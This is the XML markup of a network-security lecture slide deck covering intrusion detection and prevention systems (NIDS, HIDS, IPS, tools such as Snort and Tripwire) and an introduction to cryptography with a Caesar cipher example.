            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77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Shallow</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Fast</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Examines header information</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Deep</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Slow, requires stateful tracking of data</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Inspects all fields including variable length fields</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100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NIDS Challenges</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="775"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Deployment challenges including deployment and access limitations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Analyzing encrypted traffic</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Quantity Vs quality of signatures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Performance limitations (Speed of Processing, and Size of Storage)</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Very costly for proper management</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NIDS Pros</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77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Internet is a large attack vector</a:t>
            </a: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Fairly easy to setup</a:t>
            </a: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Does not affect the speed of the network or add load to the systems it monitors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NIDS Cons</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77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Sensors have limited speed</a:t>
            </a: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Almost impossible to detect attacks not in rule set</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105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NIDS Examples</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="781"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Tcpdump</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Snort</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HIDS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78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Host-based systems monitor their network connections and file system status. </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Have to acquire the aggregate logs of ALL critical systems at a minimum</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When potential problems are found, alerts are raised</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Monitoring and controlling traffic into and out of the host</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Generating logs that record activity on the host</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Performing actions based on what is found in the logs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Managing file changes on the host- authorized or otherwise</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105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Unix Based- HIDS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="785"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TCPWrappers and Xinetd</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Port Sentry (reacts to port scans)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Syslog</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Swatch</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Tripwire</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Syslog</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78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Unix system logger can be on a local system or other system</a:t>
            </a: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Logs can offer valuable information, but they can also be compromised</a:t>
            </a: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Swatch or other tools can monitor syslog and raise alerts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Windows Based HIDS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="789"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System Tools: Event Viewer, Netstat</a:t>
            </a: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Port and Process Tools: Fport</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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File Integrity Checkers: Tripwire for Windows</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105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Event Viewer</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="791" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1523880"/>
            <a:ext cx="7923960" cy="4799880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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Netstat -a</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="793" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="609480" y="1600200"/>
            <a:ext cx="8076600" cy="4723560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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Fport</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="795" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="533520" y="1676520"/>
            <a:ext cx="8152560" cy="4494960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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6"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IPS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="797"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Intrusion Prevention Systems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A network security device that monitors network activities for malicious or unwanted behavior and can react, in real-time, to block or prevent those activities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IPS stops attacks on systems and networks from being effective</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Technology more recent, but rapidly maturing</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>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Passive IDS Deployment</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="799" name="Picture 4" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="2209680"/>
            <a:ext cx="7273800" cy="3656880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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0"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Active IPS Deployment</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="801" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1962000" y="2816280"/>
            <a:ext cx="5219280" cy="2215440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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2"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Product Examples</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="803"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McAfee HIPS</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IBM ISS Proventia</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CheckPoint’s VPN, Smart Defens and InterSpect</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Norton Internet Security</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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Tipping Point IPS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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TextShape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7771680" cy="9900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r>
              <a:rPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>IPS Challenges</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="805" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7771680" cy="4342680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>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HIPS</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False positives</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Supports a limited suite of applications</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Requires more system resources</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Limitation on number of managed nodes by every console</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>NIPS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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Can not afford false positives?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Keeping up with traffic demands</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">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 name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7772040" cy="1469520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Cryptography</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marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Cryptographic Services</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="808"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Securing Communications</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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="809" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1905120" y="2792880"/>
            <a:ext cx="4980240" cy="2693160"/>
            <a:chOff x="1905120" y="2792880"/>
            <a:chExt cx="4980240" cy="2693160"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="810" name="Oval 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1905120" y="2792880"/>
              <a:ext cx="4980240" cy="2693160"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="811" name="Text Box 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2540880" y="4759200"/>
              <a:ext cx="1506960" cy="308520"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Cryptography</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="812" name="Picture 6" descr="MCj04314930000[1]"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId1"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="2425320" y="3480480"/>
              <a:ext cx="1783800" cy="1375200"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="813" name="Picture 8" descr="MCj04315200000[1]"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId2"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="4581360" y="3458880"/>
              <a:ext cx="1783800" cy="1375200"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="814" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3296880" y="2975400"/>
              <a:ext cx="2054160" cy="473400"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Cryptology</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="815" name="Text Box 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4244040" y="3881520"/>
              <a:ext cx="357840" cy="418680"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>+</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="816" name="Text Box 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4715280" y="4759200"/>
              <a:ext cx="1508400" cy="308520"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Cryptanalysis</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:gr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7"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The Challenge that We Face </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="818" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2054880"/>
            <a:ext cx="7772040" cy="3738600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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Securing Communications</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="820"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"Cryptography is about communications in the presence of adversaries"  (Rivest)</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Goals: </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="821" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1523880" y="3733920"/>
            <a:ext cx="6238440" cy="1409400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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2" name="Picture 9" descr="parchment_blnk"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="380880" y="1581120"/>
            <a:ext cx="5638320" cy="4362120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="823"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Confidentiality</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="824" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6095880" y="1981080"/>
            <a:ext cx="2584080" cy="4252680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>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Julius Caesar would send encrypted messages to his generals in the battlefield.</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Even if intercepted, his enemies usually could not read or decipher the messages. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="825" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1406520" y="3058560"/>
            <a:ext cx="4385880" cy="1076400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>I O D Q N H D V W </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
